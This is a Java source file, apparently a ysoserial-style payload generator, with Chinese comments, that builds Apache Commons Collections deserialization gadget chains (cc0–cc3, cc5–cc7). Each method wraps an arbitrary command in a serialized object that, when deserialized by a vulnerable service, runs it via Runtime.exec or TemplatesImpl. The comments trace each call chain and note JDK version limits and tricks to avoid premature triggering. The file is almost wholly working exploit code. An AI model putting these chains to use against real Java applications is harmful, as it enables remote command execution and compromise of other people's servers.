package cn.org.unk;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.*;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.*;
import java.util.PriorityQueue;

public class CC {


    /*
    只适用于 jdk8u66 及以下, jdk8u73 开始就不行了。
    不同之处在于 AnnotationInvocationHandler 的 readObject 方法
    导致的结果就是:
    在8u66中，创建出AnnotationInvocationHandler对象并修改memberValues，经过序列化和反序列化，memberValues不变。
    在8u73中，创建出AnnotationInvocationHandler对象并修改memberValues，经过序列化和反序列化，memberValues改变。

    具体原因可以调试代码看看

    AnnotationInvocationHandler#readObject
    AbstractInputCheckedMapDecorator#setValue
    TransformedMap#checkSetValue
    ChainedTransformer#transform
     */
    public static Object cc0(String cmd) throws Exception {
        ChainedTransformer chainedTransformer = getChainedTransformer(cmd);
        Map map = new HashMap();

        //key 这个位置必须是value，否则不触发
        map.put("value","asd");

        Map<Object,Object> decoratedMap = TransformedMap.decorate(map, new ConstantTransformer("a"), chainedTransformer);

        return Gadget.getAnnotationInvocationHandler(decoratedMap);
    }

    /*
    只适用于 jdk8u66 及以下
    AnnotationInvocationHandler#readObject
    AnnotationInvocationHandler#invoke
    LazyMap#get
    ChainedTransformer#transform
     */
    public static Object cc1(String cmd) throws Exception {
        ChainedTransformer chainedTransformer = getChainedTransformer(cmd);
        HashMap hashMap = new HashMap();
        Map lazy = LazyMap.decorate(hashMap, chainedTransformer);
        InvocationHandler handler = (InvocationHandler)Gadget.getAnnotationInvocationHandler(lazy);
        Map o = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

        return Gadget.getAnnotationInvocationHandler(o);
    }


    /**
     * 用的是 commons-collections4
     * <br><br/>
     * PriorityQueue#readObject
     * PriorityQueue#heapify
     * PriorityQueue#siftDown
     * PriorityQueue#siftDownUsingComparator
     * TransformingComparator#compare
     * ComparableComparator#compare
     * InvokerTransformer#transform
     */
    public static Object cc2(String cmd) throws Exception {
        org.apache.commons.collections4.functors.InvokerTransformer transformer
                = new org.apache.commons.collections4.functors.InvokerTransformer("newTransformer",null,null);
        org.apache.commons.collections4.comparators.TransformingComparator transformerComparator
                = new org.apache.commons.collections4.comparators.TransformingComparator(transformer);
        //触发漏洞
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);

        Util.setFieldValue(queue, "comparator", transformerComparator);

        TemplatesImpl templatesImpl = Gadget.getTemplatesImpl(cmd);

        Object[] objects = new Object[]{templatesImpl, templatesImpl};
        Util.setFieldValue(queue, "queue", objects);

        return queue;
    }

    /*
     只适用于 jdk8u66 及以下
     AnnotationInvocationHandler#readObject
     AnnotationInvocationHandler#invoke
     LazyMap#get
     ChainedTransformer#transform
     InstantiateTransformer#transform
     */
    public static Object cc3(String cmd) throws Exception {
        Templates templates = Gadget.getTemplatesImpl(cmd);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}),
        };

        Transformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap hashMap = new HashMap();
        Map lazy = LazyMap.decorate(hashMap, chainedTransformer);
        InvocationHandler handler = (InvocationHandler)Gadget.getAnnotationInvocationHandler(lazy);

        Map map = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);
        return Gadget.getAnnotationInvocationHandler(map);
    }




    /*
    BadAttributeValueExpException#readObject
    TiedMapEntry#getValue
    TiedMapEntry#toString
    LazyMap#get
    ChainedTransformer#transform
    */
    public static Object cc5(String cmd) throws Exception{

        ChainedTransformer chainedTransformer = getChainedTransformer(cmd);
        HashMap hashMap = new HashMap();
        Map lazy = LazyMap.decorate(hashMap, chainedTransformer);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(1);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy, 1);
        Util.setFieldValue(bd, "val", tiedMapEntry);

        return bd;
    }

    public static FactoryTransformer getFactoryTransformer(String cmd) throws Exception{
        TemplatesImpl templatesImpl = Gadget.getTemplatesImpl(cmd);
        InstantiateFactory shell = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templatesImpl});
        return new FactoryTransformer(shell);
    }

    public static ChainedTransformer getChainedTransformer(String cmd) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        return new ChainedTransformer(transformers);
    }

    public static Object cc6(String cmd) throws Exception{
        FactoryTransformer factoryTransformer = getFactoryTransformer(cmd);
        HashMap<Object,Object> hashMap=new HashMap();
        Map<Object,Object> lazyMap= LazyMap.decorate(hashMap,new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"aaa");
        HashMap<Object,Object> hashMap1 = new HashMap();

        //put会执行hash(key)，提前触发链条，所以在LazyMap.decorate时候随便传一个ConstantTransformer，后面再改回来
        hashMap1.put(tiedMapEntry,"bbb");
        //put过后，LazyMap会有key，所以要remove，否则反序列化时会判断key存在而不走transform
        lazyMap.remove("aaa");

        Util.setFieldValue(lazyMap,"factory",factoryTransformer);

        return hashMap1;
    }

    /*
    Hashtable#readObject
    Hashtable#reconstitutionPut
    AbstractMapDecorator#equals
    AbstractMap#equals
    LazyMap#get
    ChainedTransformer#transform
     */
    public static Object cc7(String cmd) throws Exception{
        ChainedTransformer chainedTransformer = getChainedTransformer(cmd);
        HashMap hashMap1 = new HashMap();
        HashMap hashMap2 = new HashMap();

        Map LazyMap1=LazyMap.decorate(hashMap1,chainedTransformer);
        LazyMap1.put("yy",1);
        Map LazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer);
        LazyMap2.put("zZ",1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(LazyMap1,1);
        hashtable.put(LazyMap2,1);
        LazyMap2.remove("yy");
        return hashtable;
    }


}
